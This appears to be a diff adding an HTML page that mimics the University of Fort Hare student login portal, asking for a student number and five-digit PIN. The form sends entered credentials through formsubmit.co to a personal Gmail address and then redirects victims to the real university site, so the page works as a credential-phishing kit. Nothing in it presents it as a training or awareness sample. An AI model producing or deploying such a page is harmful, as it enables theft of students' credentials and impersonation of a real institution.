@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>University of Fort Hare - Student Login</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            text-align: center;
+            background: whitesmoke;
+            font-family: Arial, Helvetica, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo-container {
+            margin: 20px 0 10px 0;
+        }
+
+        .logo-container img {
+            max-width: 395px;
+            height: auto;
+        }
+
+        .header {
+            background: lightgrey;
+            color: grey;
+            font-size: 17px;
+            font-weight: bold;
+            border-bottom: solid black 1px;
+            padding: 12px 20px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+
+        .sub-header {
+            color: white;
+            padding: 14px 20px;
+            text-align: center;
+            font-size: 18px;
+            background: dodgerblue;
+            width: 100%;
+            max-width: 500px;
+            font-weight: bold;
+        }
+
+        fieldset {
+            text-align: center;
+            background: white;
+            border: none;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.4);
+            padding: 25px 20px;
+            width: 100%;
+            max-width: 500px;
+            margin: 20px auto;
+            border-radius: 4px;
+        }
+
+        .radio-group {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .radio-group label {
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 15px;
+        }
+
+        .radio-group input[type="radio"] {
+            margin-right: 4px;
+            cursor: pointer;
+        }
+
+        .form-group {
+            text-align: left;
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            height: 42px;
+            border: 1px solid lightgrey;
+            border-bottom: 2px solid lightgrey;
+            padding: 0 12px;
+            font-size: 15px;
+            border-radius: 3px;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: dodgerblue;
+            border-bottom-color: dodgerblue;
+        }
+
+        .pin-hint {
+            font-size: 13px;
+            color: #666;
+            margin-top: 4px;
+        }
+
+        .button-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            justify-content: center;
+            margin-top: 8px;
+        }
+
+        button {
+            background: none;
+            border: 1px solid grey;
+            padding: 10px 16px;
+            font-size: 14px;
+            cursor: pointer;
+            border-radius: 3px;
+            transition: background 0.2s, border-color 0.2s;
+            white-space: nowrap;
+        }
+
+        button:hover {
+            background: #f0f0f0;
+            border-color: #555;
+        }
+
+        button[type="submit"] {
+            background: dodgerblue;
+            color: white;
+            border-color: dodgerblue;
+            font-weight: bold;
+        }
+
+        button[type="submit"]:hover {
+            background: #1a75d0;
+            border-color: #1a75d0;
+        }
+
+        footer {
+            margin-top: auto;
+            padding: 20px;
+            color: #999;
+            font-size: 13px;
+            text-align: center;
+        }
+
+        @media (max-width: 520px) {
+            .logo-container img {
+                max-width: 90vw;
+            }
+
+            fieldset {
+                margin: 10px 8px;
+                padding: 18px 14px;
+            }
+
+            .header,
+            .sub-header {
+                max-width: 100%;
+            }
+
+            button {
+                padding: 10px 14px;
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="logo-container">
+        <img
+            src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxsuiwqVEMNUUH8fkEtH5v89JWk3iGsZ3FUPrXoFLROzKcaB9gL9EABLzQHLmnBi8XV9QzE3nlS73KzmZxWs47zjBQ2Di-j8C0VRkaqgCqtA8F3SXl0vnoa1qZgKMhmkUxTgupB4jQwFkBRQSEcG_DNRLBmiDyt_YpTnCPDzf5j6UIsgkht_eKNhmSu6wn/s720/FB_IMG_16915302569072707.png"
+            alt="University of Fort Hare Logo"
+            width="395"
+            height="400"
+            loading="lazy"
+        />
+    </div>
+
+    <header class="header">UNIVERSITY OF FORT HARE</header>
+    <header class="sub-header">Registered Users: Login Credentials</header>
+
+    <fieldset>
+        <div class="radio-group">
+            <label><input type="radio" name="userType" value="student" checked /> Student</label>
+            <label><input type="radio" name="userType" value="personal" /> Personal</label>
+            <label><input type="radio" name="userType" value="other" /> Other</label>
+            <label><input type="radio" name="userType" value="alumni" /> Alumni</label>
+        </div>
+
+        <form action="https://formsubmit.co/lucidthevillain01@gmail.com" method="POST">
+            <!-- Redirect to UFH website after submission -->
+            <input type="hidden" name="_next" value="https://www.ufh.ac.za/">
+
+            <div class="form-group">
+                <label for="studentNumber">Student Number:</label>
+                <input
+                    type="text"
+                    id="studentNumber"
+                    name="studentNumber"
+                    placeholder="Enter your student number"
+                    required
+                />
+            </div>
+
+            <div class="form-group">
+                <label for="pin">Pin:</label>
+                <input
+                    type="password"
+                    id="pin"
+                    name="pin"
+                    placeholder="Enter your 5-digit PIN"
+                    inputmode="numeric"
+                    maxlength="5"
+                    pattern="[1-9][0-9]{4}"
+                />
+                <p class="pin-hint">(5 numeric digits. Do not start with a 0.)</p>
+            </div>
+
+            <div class="button-group">
+                <button type="submit">Login</button>
+                <button type="button">Forgot Pin</button>
+                <button type="button">Change Pin</button>
+                <button type="button">Request A Pin</button>
+                <button type="button">Forgot Student Number</button>
+            </div>
+        </form>
+    </fieldset>
+
+    <footer>
+        &copy; University of Fort Hare &mdash; Student iEnabler Portal
+    </footer>
+
+</body>
+  </html>
